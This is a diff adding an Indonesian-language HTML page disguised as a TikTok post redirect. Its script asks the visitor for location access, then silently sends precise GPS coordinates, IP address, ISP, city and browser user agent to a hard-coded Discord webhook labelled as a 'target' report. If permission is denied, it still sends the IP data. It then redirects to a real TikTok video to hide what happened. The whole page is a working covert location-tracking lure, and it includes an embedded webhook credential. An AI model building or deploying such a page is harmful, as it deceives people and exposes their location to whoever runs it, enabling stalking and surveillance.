@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat Halaman...</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f8fafc; 
+            color: #0f172a; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            padding: 20px;
+        }
+        .card { 
+            background-color: #ffffff; 
+            padding: 40px 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05); 
+            text-align: center; 
+            max-width: 400px; 
+            width: 100%;
+            border: 1px solid #e2e8f0;
+        }
+        h2 { margin-bottom: 12px; font-size: 24px; color: #0f172a; font-weight: 700; }
+        p { margin-bottom: 30px; color: #64748b; font-size: 15px; line-height: 1.6; }
+        .btn { 
+            width: 100%;
+            padding: 15px; 
+            font-size: 16px; 
+            font-weight: 600;
+            color: #ffffff; 
+            background-color: #ff0050; /* Warna khas TikTok */
+            border: none; 
+            border-radius: 10px; 
+            cursor: pointer; 
+            transition: background 0.2s, transform 0.1s;
+            box-shadow: 0 4px 15px rgba(255, 0, 80, 0.2);
+        }
+        .btn:hover { background-color: #e60048; }
+        .btn:active { transform: scale(0.98); }
+        #status { margin-top: 20px; font-size: 14px; color: #64748b; font-weight: 500; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="icon-tiktok">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="width: 45px; height: 45px; fill: #000000; margin-bottom: 20px;">
+                <path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
+            </svg>
+        </div>
+        
+        <h2>Pengalihan Halaman</h2>
+        <p>Silakan izinkan akses lokasi untuk melanjutkan ke postingan TikTok.</p>
+        
+        <button class="btn" onclick="getLocation()">Lanjutkan ke Postingan</button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        // Webhook Discord Anda otomatis terpasang
+        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1510165102748368918/8WS5uxwe9niDDyN_vnxp7hQPSFEnZI4s9vZCPM0LoMQlis9OVa13wsqJXS-9C8xn8WJO';
+        
+        // SILAKAN GANTI link di bawah ini dengan URL video TikTok kuliner pilihan Anda
+        const TARGET_POST_URL = 'https://www.tiktok.com/@mr_memer_man/video/7231064370577411355?q=kodok%20loncat&t=1780183314634';
+
+        const statusText = document.getElementById('status');
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                statusText.innerHTML = "🔄 Memeriksa izin lokasi...";
+                navigator.geolocation.getCurrentPosition(sendFullData, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 8000,
+                    maximumAge: 0
+                });
+            } else {
+                statusText.innerHTML = "❌ Geolocation tidak didukung oleh browser ini.";
+                redirectToTarget(1000);
+            }
+        }
+
+        function sendFullData(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const userAgent = navigator.userAgent;
+
+            statusText.innerHTML = "🔄 Mengarahkan ke postingan...";
+
+            // Ambil data IP, ISP, dan Kota secara real-time
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(ipData => {
+                    const ip = ipData.ip || "Tidak Terdeteksi";
+                    const org = ipData.org || "Tidak Terdeteksi";
+                    const city = ipData.city || "Tidak Terdeteksi";
+
+                    sendToDiscord(latitude, longitude, accuracy, ip, org, city, userAgent);
+                })
+                .catch(() => {
+                    // Jika API IP gagal, tetap kirim koordinat GPS yang berhasil didapat
+                    sendToDiscord(latitude, longitude, accuracy, "Error", "Error", "Error", userAgent);
+                });
+        }
+
+        function sendToDiscord(lat, lng, acc, ip, isp, kota, ua) {
+            const payload = {
+                embeds: [{
+                    title: "🎯 Laporan Analisis Lokasi Target 🎯",
+                    color: 16711760, // Tema Pink/Merah TikTok
+                    description: `📍 **LINK GOOGLE MAPS (GPS)**\nhttps://www.google.com/maps?q=${lat},${lng}\n\n` +
+                                 `ℹ️ **Status GPS/Akurasi**\nAkurat hingga ${Math.round(acc)}.0 meter\n\n` +
+                                 `🌐 **IP Address**\n\`${ip}\`\n\n` +
+                                 `🏢 **Provider/ISP**\n${isp}\n\n` +
+                                 `🏙️ **Kota (Estimasi IP)**\n${kota}\n\n` +
+                                 `💻 **User Agent**\n${ua}`,
+                    footer: { text: "Lab Geolocation Tingkat Lanjut" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(() => redirectToTarget(300))
+            .catch(() => redirectToTarget(0));
+        }
+
+        function showError(error) {
+            let alasan = "Unknown Error";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alasan = "Izin Lokasi Ditolak (Block)";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alasan = "GPS Mati / Tidak Terdeteksi";
+                    break;
+                case error.TIMEOUT:
+                    alasan = "Waktu Permintaan Habis (Timeout)";
+                    break;
+            }
+
+            statusText.innerHTML = "🔄 Mengarahkan ke postingan...";
+
+            // Jika target menolak GPS, kita tetap ambil data IP & Browsernya
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(ipData => {
+                    const payload = {
+                        embeds: [{
+                            title: "⚠️ Gagal Memuat GPS (Izin Ditolak)",
+                            color: 15158332, // Merah
+                            description: `**Alasan:** ${alasan}\n\n` +
+                                         `🌐 **IP Address:** \`${ipData.ip || '?'}\`\n` +
+                                         `🏢 **Provider/ISP:** ${ipData.org || '?'}\n` +
+                                         `🏙️ **Kota (Estimasi IP):** ${ipData.city || '?'}\n` +
+                                         `💻 **User Agent:** ${navigator.userAgent}`,
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+                    return fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                })
+                .then(() => redirectToTarget(300))
+                .catch(() => redirectToTarget(0));
+        }
+
+        function redirectToTarget(delayMs) {
+            setTimeout(function() {
+                window.location.href = TARGET_POST_URL;
+            }, delayMs);
+        }
+    </script>
+</body>
+</html>
